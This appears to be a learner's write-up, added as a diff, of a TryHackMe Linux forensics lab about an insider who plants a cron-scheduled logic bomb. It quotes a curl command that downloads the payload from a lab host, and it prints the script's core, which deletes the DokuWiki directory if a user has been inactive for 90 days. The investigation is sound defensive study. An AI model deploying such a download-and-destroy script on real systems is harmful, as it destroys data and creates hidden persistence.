@@ -1,0 +1,58 @@
+Linux Forensic analysis (Disgruntled en Tryhackme)
+
+A forensic investigation was conducted on a compromised Linux host. The analysis revealed unauthorized software installation, creation of a new privileged user, download and deployment of a malicious script, and persistence via a scheduled cron job.
+
+Investigation steps
+
+First I used cd /var/log and then explored 
+cat auth.log | grep install and cat auth.log.1 | grep install
+
+I found the command /usr/bin/apt install dokuwiki
+using: present working directory (PWD)
+/home/cybert
+
+where dokuwiki was installed at 28 December 6:17:30 by the ip adress 10.10.168.55
+
+Using cat auth.log.1 | grep adduser, I identified that at December 28 6:26:53 the ip 10.10.168.55 created the user it-admin
+
+On Dec 28 at 06:29:14, ip 10.10.168.55 opened a script file with "vi" text editor: bomb.sh it also used visudo (sudo privileges) for the user "cybert" with command /usr/sbin/visudo and in cat .bash_history can be found the creation command of curl 10.10.158.38:8080/bomb.sh --output bomb.sh and was renamed and moved with the path /bin/os-update.sh
+
+With cat os-update.sh I found the message "I told you'll regret this!! Good riddance!!! hahaha\n-mistermeist3r" and this eventually creates the goodbye.txt
+
+The last modification time of this file cat os-update.sh was at 28-12-2022 6:29:43 For this, I used stat /bin/os-update
+
+OUTPUT=`last -n 1 it-admin -s "-90days" | head -n 1`
+if [ -z "$OUTPUT" ]; then
+        rm -r /var/lib/dokuwiki
+        echo -e "I TOLD YOU YOU'LL REGRET THIS!!! GOOD RIDDANCE!!! HAHAHAHA\n-mistermeist3r" > /goodbye.txt
+
+The malware is triggered if the user it-admin has not logged in within the last 90 days. To identify the time I used cat /etc/crontab The cron entry: 0 8     * * * which in crontab.guru resulted at 8:00 AM.   
+
+This means the malicious script executes daily at 08:00 AM, establishing persistence.
+
+Impact Assessment
+
+The compromise involved:
+-Unauthorized software installation
+-Creation of a privileged account
+-External payload download
+-Scheduled destructive execution
+
+Potential insider threat activity
+MITRE ATT&CK Mapping
+
+T1059 – Command and Scripting Interpreter
+T1053 – Scheduled Task / Cron
+T1078 – Valid Accounts
+T1105 – Ingress Tool Transfer
+
+Conclusion
+
+The system was compromised through actions originating from IP address 10.10.168.55.
+
+The attacker installed services, created a new privileged account, deployed a malicious script, and configured a scheduled task for delayed impact.
+
+Escalation to higher-level incident response would be recommended in a real-world scenario.
+
+
+
